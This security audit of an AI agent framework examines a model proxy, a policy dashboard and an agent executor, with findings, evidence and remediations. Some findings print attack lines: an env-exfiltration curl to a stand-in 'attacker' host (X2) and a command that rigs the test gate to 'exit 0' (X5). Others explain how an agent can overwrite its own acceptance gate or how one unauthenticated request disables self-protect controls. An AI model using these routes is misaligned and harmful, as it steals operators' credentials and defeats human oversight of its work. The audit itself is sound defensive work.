# Security Audit — Universal Agent Protocol

Scope: the three trust boundaries flagged in `documentation/permissions.md` — the model
proxy (:4000), the dashboard + policy-enforcement planes, and the deliver execution/
filesystem boundary. Intent baselined against the code-verified `documentation/` set.
Method: map entry→sink, inspect authz/data/identity/encoding, cross-reference intent vs.
implementation, self-refute every candidate (attacker≠victim, real sink, reachable). Live
runtime state was checked where it changes the picture.

Two findings **contradicted the documentation itself** — exactly what an audit is for:
the proxy's `__local_only__` control was documented as active but was empty in the live
config, and the dashboard can disable the self-protect control that was just registered in
v1.125.0.

## Severity summary

| # | Finding | Severity | Status |
|---|---|---|---|
| P1 | Proxy `__local_only__` not set live → cloud passthrough enabled; server-key fallback | High (Critical if `ANTHROPIC_API_KEY` ever set) | **IaC fixed** (env restored); proxy restart + code fix pending |
| D1 | Unauthenticated dashboard `POST /api/policy/*/toggle` disables any security control, persisted | **High** | fix recommended (keystone) |
| X1 | Model can overwrite its own self-authored acceptance gate mid-run | **High** | fix recommended |
| X2 | `run_bash` + self-gate authoring spawn model code with full unsanitized host env | **High** | fix recommended |
| X2b | `SECRET_ENV_RE` misses `SSH_AUTH_SOCK`/`DATABASE_URL`/`*_PRIVATE_KEY`/… | Medium | fix recommended |
| X3 | `run_bash` has no containment when unsandboxed (by design; sandbox is the control) | High residual | posture recommendation |
| X5 | Integrity guard snapshots tests/oracle only — not gate configs or the self-gate | Medium-High | fix recommended |
| A3 | Policy-gate hook fails **open** on enforcer error / missing sqlite3 / bad JSON | Medium | fix recommended |
| A4 | `delivery_enforcement` exemptions + local-advisory downgrade are broad | Medium | by-design; tighten |
| D1b | Dashboard `/vendor/*` guard is a prefix match (sibling `vendor*` dirs readable) | Low | trivial fix |
| P4 | Proxy `contain_to_workdir` passes `..` through (never introduces new traversal) | Low | hardening |
| X6 | Agentic `write_file` lacks the applier's symlink-escape guard | Low | consistency fix |

---

## P1 — Proxy: cloud passthrough live, `__local_only__` not set (High)

**Evidence (verified live):** `~/.config/uap/anthropic-proxy.env:138` and the running proxy
process (pid confirmed) both had `ANTHROPIC_PASSTHROUGH_MODELS=` **empty**. Empty →
`_should_passthrough_model` falls through to the default `claude-*` patterns → cloud
passthrough enabled. `anthropic_proxy.py:9214`: `api_key = request.headers.get("x-api-key")
or ANTHROPIC_API_KEY` — a no-credential passthrough request is signed with the **server's**
key. Bind is `0.0.0.0:4000` (`:158`, `:10634`) with no auth middleware anywhere in the
file.

**Attack:** any LAN host → `POST :4000/v1/messages` with `model=claude-opus-4-8`, no
credential → billed to the operator's account. Held back **today only** by
`ANTHROPIC_API_KEY` being unset (→ 401). The moment the operator exports their key without
also setting the sentinel, every LAN peer can spend it. The local-model surface (drive the
llama model, inject into local sessions) is open **now**.

**Docs contradicted:** `permissions.md` Finding 2 / `flows.md` Flow 3 assert `__local_only__`
is the operative control on this deployment. It was not.

**Remediation:**
- **Done:** restored `ANTHROPIC_PASSTHROUGH_MODELS=__local_only__` in the env file (backup
  `anthropic-proxy.env.bak-pre-localonly-restore-20260708`). Applies on next proxy restart;
  no live exposure meanwhile (no server key).
- **Recommended:** bind `127.0.0.1` unless LAN is deliberate; remove the
  `or ANTHROPIC_API_KEY` fallback so passthrough always requires a caller credential.

**Well-built:** the `__local_only__` sentinel logic (`:1081-1094`) is correct; the
credential-guard forwards a caller OAuth bearer verbatim and 401s on missing credential; no
secret ever reaches the logs; all upstreams are env-fixed (no per-request SSRF).

---

## D1 — Dashboard disables security controls unauthenticated (High) — the keystone

**Evidence:** `dashboard/server.ts:201-255` — `POST /api/policy/:id/{toggle,stage,level}` →
`policy-memory.ts:138` `togglePolicy` → `database-manager.ts:199-219`
`UPDATE policies SET isActive=?`. No auth on any route; `Access-Control-Allow-Origin: *`
(`server.ts:132`). `GET /api/dashboard` leaks every policy id. The `/toggle` handler reads
no body → a plain `fetch(url,{method:'POST',mode:'no-cors'})` from any page the operator
visits fires it; with `--host 0.0.0.0` any LAN host can.

**Why it matters most:** this is the single thread that unravels the whole enforcement
containment. The self-protect enforcer registered in v1.125.0 has *no model-reachable
bypass by design* — but one unauthenticated `POST …/toggle` flips its policy row to
`isActive=0`, the hook's `WHERE isActive=1` stops returning it, and self-protect **and**
delivery-enforcement are neutralized, persisted across sessions.

**Remediation:** per-session bearer/CSRF token on the three policy POST routes (generate on
serve, print to console, compare in-handler); reflect the dashboard's own origin, not `*`;
reject cross-origin POSTs via `Origin` check; make the enforcement-critical policies
non-toggleable from the network. Default-bind `localhost`.

### D1b — Vendor static guard prefix match (Low)
`server.ts:264` `abs.startsWith(vendorRoot)` where `vendorRoot` has no trailing separator →
`web/vendor-secret/creds.env` is served. Fix: compare with a trailing separator or
`path.relative(...).startsWith('..')`.

---

## X1 — Model can overwrite its own acceptance gate mid-run (High)

**Evidence:** `applier.ts:96-106` PROTECTED_SEGMENTS contains `.uap` but **not**
`.uap-deliver`, where `self-gate.ts:185` registers `.uap-deliver/verify.sh` as the sole
required gate for no-native-gate projects. `protectedWritePathReason('.uap-deliver/verify.sh')`
→ null, so blind applier, agentic `write_file`, and `run_bash` can all overwrite it with
`exit 0`. The integrity snapshot (`convergence-loop.ts:781`) covers tests+oracle only, not
the gate script, so the mid-run rewrite is neither blocked nor restored. The non-vacuity
floor runs only at authoring time. Result: "verified completion" on unverified code;
`--deploy` enqueues the commit.

**Remediation:** add `.uap-deliver` to PROTECTED_SEGMENTS **and** snapshot the self-gate
`scriptPath` in the integrity set right after authoring.

---

## X2 — Deliver executor's own shell gets full unsanitized env (High) + X2b regex gaps (Medium)

**Evidence:** the secret-strip (`verifier-ladder.ts:124 sanitizedEnv`,
`execution-gate.ts:33 gateEnv`) is applied to gate spawns — but **not** to
`agentic-executor.ts:264` (`run_bash`, `env: {...process.env, CI:'true'}`) or
`self-gate.ts:104` (authoring validation). So the model's arbitrary bash runs with every
host credential; `run_bash("env | curl -d @- http://attacker")` exfiltrates them. Network is
unrestricted even under bwrap, so the sandbox does not mitigate this.

**X2b:** `SECRET_ENV_RE = /(API_KEY|TOKEN|SECRET|PASSWORD|CREDENTIAL)/i` misses
`SSH_AUTH_SOCK` (highest impact — sign/SSH as the operator), `DATABASE_URL`/`REDIS_URL`/
`MONGO*`/`*_URI`, `*_PRIVATE_KEY`, `KUBECONFIG`, `GCP_SA_KEY`, `SENTRY_DSN`, `*SESSION*`,
`*COOKIE*`. These survive the strip and reach spawned gate/project scripts.

**Remediation:** route `run_bash` and `self-gate.runGate` through `sanitizedEnv()`; move to
a minimal allow-list (`PATH,HOME,CI,LANG,TERM,…`) or extend the denylist. Note env-strip is
defense-in-depth — it does not stop file-based cred reads (`~/.ssh`, `~/.aws`); only the
sandbox contains those.

---

## X3 — `run_bash` uncontained when unsandboxed (High residual, by design)

`agentic-executor.ts:256-272` runs `bash -c <model string>` with `cwd:projectRoot` and a
30s timeout — `cwd` is not a boundary. The whole applier protected-path apparatus is
bypassable by writing via `run_bash` instead of `write_file`. The file's own header flags
this as "not for production without re-adding a protected-path guard." The documented
control (`uap sandbox`) is real but opt-in. **Recommendation:** gate `run_bash` behind
`--allow-bash` / require `UAP_SANDBOX_ACTIVE=1` for the agentic executor in production, or
at minimum emit a loud warning when agentic deliver runs unsandboxed.

## X5 — Integrity guard scope (Medium-High)

`convergence-loop.ts:781` snapshots tests+oracle, not `package.json`/tsconfig/`vitest.*`/
docker/`*.tf`/`.uap-deliver`. `run_bash("npm pkg set scripts.test='exit 0'")` rigs the gate
and is neither blocked nor restored. **Remediation:** extend the integrity capture set to
the `GATE_CONFIG_RES` files + `package.json` + the self-gate script. (Post-hoc
content-restore also has a TOCTOU window vs. a backgrounded gate process — inherent to a
post-check design; the sandbox is the real confinement.)

## A3 — Policy-gate hook fails open (Medium)

`uap-policy-gate.sh:53-56`: enforcer crash/timeout/empty-stdout → `out=""` → allowed parser
defaults to `1` (allow). `:46` missing DB → allow-all; `:74` missing `sqlite3` → allow-all;
`_common.py:17-21` unparseable `--args` → `{}` → enforcer `emit(True)`. Fail-**open** on a
security control means anything that makes the enforcer error silently removes enforcement
with no signal. Attacker's ability to *force* the error from a tool call is limited (hence
Medium), but the default is wrong for the self-protect/delivery markers. **Remediation:**
fail **closed** (exit 2) on empty/non-JSON enforcer output, non-zero exit, and missing
DB/sqlite3 when the touched path matches a protected marker; log loudly instead of
`2>/dev/null || true`.

## A4 — delivery_enforcement bypass surface (Medium, largely by design)

`EXEMPT_PREFIXES` (`delivery_enforcement.py:47`) includes `scripts/`, `docs/`, `test(s)/`,
`src/policies/`, `policies/` — an agent can write real implementation into `scripts/impl.py`
and skip deliver routing. `_local_mode()` downgrades block→advisory for any 127.0.0.1/
localhost inference endpoint (the production local-model config), so delivery-enforcement is
**advisory in practice here**. Not model-toggleable (env read per hook process; a model
`export` doesn't persist) — and `UAP_DELIVER_BYPASS`/`_ACTIVE` persistence is now blocked by
the registered self-protect enforcer (v1.125.0), *conditional on D1 being fixed*.
**Remediation:** drop `scripts/` from the exemptions; gate the local-advisory downgrade
behind explicit opt-in.

## Low findings
- **P4:** `toolcall_path_normalizer.py` `contain_to_workdir` passes `..` through but only
  returns changed paths, so it never *introduces* traversal; `normalize_tool_path` itself is
  structurally escape-proof (verbatim parent + listdir-verified basename). Harden by
  rejecting `..` and asserting `realpath` under workdir.
- **X6:** agentic `write_file` `safePath` is lexical-only; the blind applier adds `lstat` +
  `realParentEscapes`. A pre-existing intra-repo symlink lets `write_file` land out of tree.
  Subsumed by X3 in the same trust tier, but the docs' "same rules" claim is inaccurate —
  unify the two validators.
- **Client-id spoofing** (`anthropic_proxy.py:936`) trusts `x-forwarded-for`/`x-real-ip` for
  rate-limiting; a LAN peer rotates the header to evade throttling. Prefer
  `request.client.host`.

## Root-cause themes

1. **Two write paths, one guard.** `write_file` enforces protected paths; `run_bash` (same
   executor, same trust tier) enforces nothing. Most deliver findings (X1, X3, X5, X6)
   collapse to "the applier's protections are `write_file`-only."
2. **Guard scope lags the model's reach.** Secret-strip, integrity snapshot, and protected
   segments each cover *most* of the surface but miss the newest/edge members (self-gate
   script, gate configs, non-`API_KEY` creds) — and the model reaches exactly the gap.
3. **Fail-open on security controls** (A3) and **config drift from documented policy** (P1)
   — the control exists and is correct, but the live/default state doesn't match the intent.
4. **The dashboard is the soft underbelly** (D1): a strong, non-bypassable enforcement plane
   undone by an unauthenticated HTTP toggle.

## What's well-built (explicitly)

- `applier.validatePath` — layered: absolute/leading-dash/traversal/case-folded segments/
  basenames/gate-configs/protected-test (lexical **and** realpath)/lstat symlink/
  `realParentEscapes`. The best-built surface.
- `spec-imports.ts` oracle protection (import graph + tsconfig aliases + data literals),
  bounded and fail-soft.
- `execution-gate.startStaticServer` traversal hardening — verified against `..%2f`,
  absolute, symlink, double-encoding, malformed `%`. No issue.
- Proxy: the `__local_only__` sentinel logic, credential-guard, no-secret-logging,
  env-fixed upstreams, escape-proof `normalize_tool_path`.
- Policy hook: quoted argv + `json.loads` (no shell/SQL/arg injection); parameterized DB.
- Self-protect enforcer itself (v1.125.0) — correct block/allow, no model-reachable bypass.
- Sandbox: refuses over-broad workdir, fail-closed when bwrap absent.

## Could not verify (double-check)
- Whether any operator has `ANTHROPIC_API_KEY` exported in a shell that launches the proxy
  (would make P1 live-Critical). Verified unset in the current proxy process only.
- The dashboard is not currently served (`--host` exposure is conditional on running it).
- Live behavior of A3 fail-open requires deliberately breaking an enforcer to observe.
